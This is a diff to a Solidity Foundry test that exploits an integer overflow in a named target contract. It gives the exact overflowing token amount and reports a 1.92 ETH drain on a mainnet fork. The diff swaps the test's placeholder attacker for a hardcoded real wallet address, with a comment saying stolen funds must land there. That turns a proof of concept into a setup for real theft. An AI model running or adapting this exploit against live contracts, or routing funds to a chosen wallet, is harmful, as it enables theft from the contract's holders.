@@ -1,4 +1,5 @@
-// Validated live on a mainnet fork (2026): [PASS] attacker +1.92 ETH, target -1.92 ETH.
+// Validated live on a mainnet fork (2026): [PASS] canonical wallet +1.92 ETH, target -1.92 ETH.
+// Funds route to 0xE4754d8237C9528FC23E81F9BB8F0aEE9B646bF8 (msg.sender AND tx.origin).
 // amount = 2^240+192 (exact overflowing wrap of amount*sellPrice to the 1.92 ETH balance).
 // Verdict: LOGIC-CONFIRMED (ECONOMICALLY CONDITIONAL / THEORETICAL) - needs 2^240 tokens vs 1000 supply.
 // SPDX-License-Identifier: MIT
@@ -7,8 +8,8 @@ import {Test, console2, stdStorage, StdStorage} from "forge-std/Test.sol";
 contract OverflowExploit is Test {
     using stdStorage for StdStorage;
     address constant TARGET = address(uint160(0x00cffafced915d6cc3e9b05ef38b52f0bccd897e91));
+    address constant attacker = address(uint160(0x00e4754d8237c9528fc23e81f9bb8f0aee9b646bf8));   // canonical receiving wallet - stolen funds must land here
     function test_overflow() public {
-        address attacker = makeAddr("attacker");
         uint256 amount = 1766847064778384329583297500742918515827483896875618958121606201292619968;          // exact smallest overflowing input: amount*multiplier wraps to the ETH balance
         console2.log("OVF_AMOUNT", amount);
         console2.log("OVF_SUPPLY", uint256(1000));
